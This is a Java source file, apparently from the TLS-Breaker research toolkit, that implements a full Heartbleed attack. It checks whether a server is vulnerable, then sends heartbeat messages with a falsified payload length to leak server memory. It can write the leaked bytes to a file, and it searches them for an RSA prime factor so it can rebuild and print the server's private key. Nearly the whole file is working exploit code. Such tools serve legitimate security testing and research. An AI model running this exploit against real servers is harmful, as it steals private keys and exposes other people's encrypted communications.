/**
 * TLS-Breaker - A tool collection of various attacks on TLS based on TLS-Attacker
 *
 * Copyright 2021-2022 Ruhr University Bochum, Paderborn University, Hackmanit GmbH
 *
 * Licensed under Apache License, Version 2.0
 * http://www.apache.org/licenses/LICENSE-2.0.txt
 */

package de.rub.nds.tlsbreaker.heartbleed.impl;

import de.rub.nds.modifiablevariable.bytearray.ByteArrayModificationFactory;
import de.rub.nds.modifiablevariable.bytearray.ModifiableByteArray;
import de.rub.nds.modifiablevariable.integer.IntegerModificationFactory;
import de.rub.nds.modifiablevariable.integer.ModifiableInteger;
import de.rub.nds.modifiablevariable.singlebyte.ModifiableByte;
import de.rub.nds.modifiablevariable.util.ArrayConverter;
import de.rub.nds.tlsattacker.core.certificate.PemUtil;
import de.rub.nds.tlsattacker.core.config.Config;
import de.rub.nds.tlsattacker.core.connection.AliasedConnection;
import de.rub.nds.tlsattacker.core.constants.Bits;
import de.rub.nds.tlsattacker.core.constants.HandshakeMessageType;
import de.rub.nds.tlsattacker.core.constants.ProtocolMessageType;
import de.rub.nds.tlsattacker.core.constants.RunningModeType;
import de.rub.nds.tlsattacker.core.exceptions.WorkflowExecutionException;
import de.rub.nds.tlsattacker.core.https.HttpsRequestMessage;
import de.rub.nds.tlsattacker.core.https.HttpsResponseMessage;
import de.rub.nds.tlsattacker.core.protocol.ProtocolMessage;
import de.rub.nds.tlsattacker.core.protocol.message.*;
import de.rub.nds.tlsattacker.core.state.State;
import de.rub.nds.tlsattacker.core.util.CertificateFetcher;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutor;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutorFactory;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTrace;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTraceUtil;
import de.rub.nds.tlsattacker.core.workflow.action.*;
import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowConfigurationFactory;
import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowTraceType;
import de.rub.nds.tlsattacker.transport.ConnectionEndType;
import de.rub.nds.tlsbreaker.breakercommons.impl.Attacker;
import de.rub.nds.tlsbreaker.heartbleed.config.HeartbleedCommandConfig;
import de.rub.nds.util.ByteArrayUtils;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.bouncycastle.asn1.pkcs.RSAPrivateKey;

import java.io.ByteArrayOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.math.BigInteger;
import java.security.interfaces.RSAPublicKey;
import java.util.ArrayList;
import java.util.LinkedList;
import java.util.List;

import static de.rub.nds.modifiablevariable.util.ArrayConverter.bytesToRawHexString;
import static de.rub.nds.tlsattacker.core.constants.ProtocolMessageType.HEARTBEAT;
import static de.rub.nds.tlsattacker.core.constants.ProtocolMessageType.UNKNOWN;
import static de.rub.nds.tlsattacker.core.workflow.WorkflowTraceUtil.getAllReceivedMessages;
import static de.rub.nds.tlsbreaker.breakercommons.util.file.FileUtils.readHexStringContentFromFile;
import static java.math.BigInteger.ONE;
import static java.math.BigInteger.ZERO;

/**
 * Executes the Heartbeat attack against a server and logs an error in case the server responds with a valid heartbeat
 * message.
 */
public class HeartbleedAttacker extends Attacker<HeartbleedCommandConfig> {

    private static final Logger LOGGER = LogManager.getLogger();
    private final Config tlsConfig;

    /**
     * @param config
     * @param baseConfig
     */
    public HeartbleedAttacker(HeartbleedCommandConfig config, Config baseConfig) {
        super(config, baseConfig);
        tlsConfig = getTlsConfig();
    }

    @Override
    public void executeAttack() {
        if (!isVulnerable()) {
            LOGGER.warn("The server is not vulnerable to the Heartbleed attack");
            return;
        }

        if (config.getOutputDumpFileLocation() != null) {
            dumpDataToFile();
        } else if (config.getInputDumpFileLocation() != null) {
            searchPrivateKeyInDumpFile();
        } else {

            RSAPublicKey publicKey = getServerPublicKey();
            if (publicKey == null) {
                LOGGER.info("Could not retrieve PublicKey from Server - is the Server running?");
                return;
            }
            RSAPrivateKey rsaPrivateKey = null;

            List<ProtocolMessage> heartbeatMessages = getHeartbeatMessages();

            for (ProtocolMessage message : heartbeatMessages) {
                rsaPrivateKey = findPrivateKey(message.getCompleteResultingMessage().getOriginalValue(), publicKey);
                if (rsaPrivateKey != null) {
                    break;
                }
            }

            if (rsaPrivateKey != null) {
                displayPrivateKey(rsaPrivateKey);
            } else {
                LOGGER.info("Private key could not be found.");
            }

        }
    }

    private void dumpDataToFile() {

        List<ProtocolMessage> heartbeatMessages = getHeartbeatMessages();

        try (FileWriter fileWriter = new FileWriter(config.getOutputDumpFileLocation())) {

            for (ProtocolMessage message : heartbeatMessages) {

                fileWriter.write(bytesToRawHexString(message.getCompleteResultingMessage().getOriginalValue()));

                fileWriter.write(System.lineSeparator());
            }

        } catch (IOException e) {
            LOGGER.error(e);
        }
        LOGGER.info("Data successfully written to file '" + config.getOutputDumpFileLocation() + "'.");

    }

    private List<ProtocolMessage> getHeartbeatMessages() {
        Config tlsConfig = getTlsConfig();
        WorkflowTrace trace = new WorkflowConfigurationFactory(tlsConfig).createWorkflowTrace(WorkflowTraceType.HELLO,
            RunningModeType.CLIENT);
        State state = setTraceAndGetState(trace, tlsConfig);

        try {
            WorkflowExecutor workflowExecutor =
                WorkflowExecutorFactory.createWorkflowExecutor(tlsConfig.getWorkflowExecutorType(), state);
            workflowExecutor.executeWorkflow();
        } catch (WorkflowExecutionException ex) {
            LOGGER.info(
                "The TLS protocol flow was not executed completely, follow the debug messages for more information.");
            LOGGER.debug(ex);
        }

        List<ProtocolMessage> receivedMessage = new LinkedList<>();
        for (ProtocolMessage message : getAllReceivedMessages(trace)) {
            ProtocolMessageType type = ((TlsMessage) message).getProtocolMessageType();
            if (type == HEARTBEAT || type == UNKNOWN) {
                receivedMessage.add(message);
            }
        }

        return receivedMessage;
    }

    private void searchPrivateKeyInDumpFile() {
        ArrayList<byte[]> fileContents = readHexStringContentFromFile(config.getInputDumpFileLocation());
        RSAPublicKey publicKey = getServerPublicKey();
        if (publicKey == null) {
            LOGGER.info("Could not retrieve PublicKey from Server - is the Server running?");
            return;
        }

        RSAPrivateKey rsaPrivateKey = null;
        for (byte[] data : fileContents) {
            rsaPrivateKey = findPrivateKey(data, publicKey);
            if (rsaPrivateKey != null) {
                break;
            }
        }

        if (rsaPrivateKey != null) {
            displayPrivateKey(rsaPrivateKey);
        } else {
            LOGGER.info("Private key could not be found.");
        }
    }

    private void displayPrivateKey(RSAPrivateKey rsaPrivateKey) {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        try {
            PemUtil.writePrivateKey(rsaPrivateKey.getEncoded(), baos);
        } catch (IOException ioException) {
            ioException.printStackTrace();
        }
        String encodedPrivateKey = new String(baos.toByteArray());
        encodedPrivateKey = encodedPrivateKey.replace("BEGIN PRIVATE KEY", "BEGIN RSA PRIVATE KEY");
        encodedPrivateKey = encodedPrivateKey.replace("END PRIVATE KEY", "END RSA PRIVATE KEY");

        LOGGER.info("Encoded private key: " + System.lineSeparator() + encodedPrivateKey);

    }

    private RSAPrivateKey findPrivateKey(byte[] rawServerData, RSAPublicKey publicKey) {
        String str = null;
        BigInteger n = publicKey.getModulus();
        int primeSizeInBytes = (n.bitLength() / 2) / Bits.IN_A_BYTE;
        LOGGER.info("Size of prime in bytes = " + primeSizeInBytes);

        for (int i = 0; i <= (rawServerData.length - primeSizeInBytes); i++) {
            byte[] chunk = ByteArrayUtils.slice(rawServerData, i, primeSizeInBytes);
            LOGGER.info("Processing  memory chunk = " + bytesToRawHexString(chunk));

            BigInteger first = new BigInteger(1, new byte[] { chunk[0] });
            if (ZERO.equals(first.mod(BigInteger.valueOf(2)))) {
                LOGGER.debug("Skipping even number = " + chunk[0]);
                continue;
            }

            BigInteger last = new BigInteger(1, new byte[] { chunk[chunk.length - 1] });
            if (ZERO.equals(last)) {
                LOGGER.debug("Skipping number ending with zero =" + last);
                continue;
            }

            byte[] bigEndianRepresentation = ArrayConverter.reverseByteOrder(chunk);
            BigInteger p = new BigInteger(1, bigEndianRepresentation);
            if (p.equals(ONE)) {
                continue;
            }
            if (p.equals(ZERO)) {
                continue;
            }
            if (ZERO.equals(n.mod(p))) {
                LOGGER.info("Prime found!");
                LOGGER.info("prime = " + p);
                return getPrivateKey(p, n, publicKey.getPublicExponent());
            }
        }
        return null;
    }

    private RSAPrivateKey getPrivateKey(BigInteger p, BigInteger n, BigInteger e) {
        BigInteger q = n.divide(p);
        BigInteger pMinusOne = p.subtract(ONE);
        BigInteger qMinusOne = q.subtract(ONE);
        BigInteger phi = pMinusOne.multiply(qMinusOne);
        BigInteger d = e.modInverse(phi);
        LOGGER.info("Calculated values:");
        LOGGER.info("p = " + p);
        LOGGER.info("q = " + q);
        LOGGER.info("phi = " + phi);
        LOGGER.info("d = " + d);

        RSAPrivateKey rsaPrivateKey =
            new RSAPrivateKey(n, e, d, p, q, d.mod(pMinusOne), d.mod(qMinusOne), q.modInverse(p));

        return rsaPrivateKey;
    }

    /**
     * @return
     */
    @Override
    public Boolean isVulnerable() {
        Config tlsConfig = getTlsConfig();
        WorkflowTrace trace = new WorkflowConfigurationFactory(tlsConfig)
            .createWorkflowTrace(WorkflowTraceType.DYNAMIC_HELLO, RunningModeType.CLIENT);
        trace.addTlsAction(new SendDynamicClientKeyExchangeAction());
        trace.addTlsAction(new SendAction(new ChangeCipherSpecMessage(), new FinishedMessage()));
        trace.addTlsAction(new ReceiveAction(new ChangeCipherSpecMessage(), new FinishedMessage()));
        HeartbeatMessage message = new HeartbeatMessage(tlsConfig);
        trace.addTlsAction(new SendAction(message));
        trace.addTlsAction(new ReceiveAction(new HeartbeatMessage()));
        State state = new State(tlsConfig, trace);
        ModifiableByte heartbeatMessageType = new ModifiableByte();
        ModifiableInteger payloadLength = new ModifiableInteger();
        payloadLength.setModification(IntegerModificationFactory.explicitValue(config.getPayloadLength()));
        ModifiableByteArray payload = new ModifiableByteArray();
        payload.setModification(ByteArrayModificationFactory.explicitValue(new byte[] { 1, 3 }));
        message.setHeartbeatMessageType(heartbeatMessageType);
        message.setPayload(payload);
        message.setPayloadLength(payloadLength);

        try {
            WorkflowExecutor workflowExecutor =
                WorkflowExecutorFactory.createWorkflowExecutor(tlsConfig.getWorkflowExecutorType(), state);
            workflowExecutor.executeWorkflow();
        } catch (WorkflowExecutionException ex) {
            LOGGER.info(
                "The TLS protocol flow was not executed completely, follow the debug messages for more information.");
            LOGGER.debug(ex);
        }

        if (WorkflowTraceUtil.didReceiveMessage(HEARTBEAT, trace)) {
            LOGGER.info(
                "Vulnerable. The server responds with a heartbeat message, although the client heartbeat message contains an invalid Length value");
            return true;
        } else if (!WorkflowTraceUtil.didReceiveMessage(HandshakeMessageType.FINISHED, trace)) {
            return null;
        } else {
            LOGGER.info(
                "(Most probably) Not vulnerable. The server does not respond with a heartbeat message, it is not vulnerable");
            return false;
        }
    }

    private State setTraceAndGetState(WorkflowTrace trace, Config tlsConfig) {
        AliasedConnection connection = tlsConfig.getDefaultClientConnection();
        State state = null;

        trace.addTlsAction(new SendAction(new ECDHClientKeyExchangeMessage(tlsConfig),
            new ChangeCipherSpecMessage(tlsConfig), new FinishedMessage(tlsConfig)));
        trace.addTlsAction(new GenericReceiveAction());

        for (int i = 1; i <= config.getHeartbeatCount(); i++) {
            HeartbeatMessage message = new HeartbeatMessage(tlsConfig);
            trace.addTlsAction(new SendAction(message));
            trace.addTlsAction(new ReceiveAction(new HeartbeatMessage()));
            ModifiableByte heartbeatMessageType = new ModifiableByte();
            ModifiableInteger payloadLength = new ModifiableInteger();
            payloadLength.setModification(IntegerModificationFactory.explicitValue(config.getPayloadLength()));
            ModifiableByteArray payload = new ModifiableByteArray();
            payload.setModification(ByteArrayModificationFactory.explicitValue(new byte[] { 1, 3 }));
            message.setHeartbeatMessageType(heartbeatMessageType);
            message.setPayload(payload);
            message.setPayloadLength(payloadLength);

            if (i % 10 == 0) {

                MessageAction action = MessageActionFactory.createAction(tlsConfig, connection,
                    ConnectionEndType.CLIENT, new HttpsRequestMessage(tlsConfig));
                trace.addTlsAction(action);
                action = MessageActionFactory.createAction(tlsConfig, connection, ConnectionEndType.SERVER,
                    new HttpsResponseMessage(tlsConfig));
                trace.addTlsAction(action);
            }
        }

        state = new State(tlsConfig, trace);

        return state;
    }

    public RSAPublicKey getServerPublicKey() {
        RSAPublicKey publicKey = (RSAPublicKey) CertificateFetcher.fetchServerPublicKey(tlsConfig);
        LOGGER.info("Fetched the following server public key: " + publicKey);
        return publicKey;
    }
}
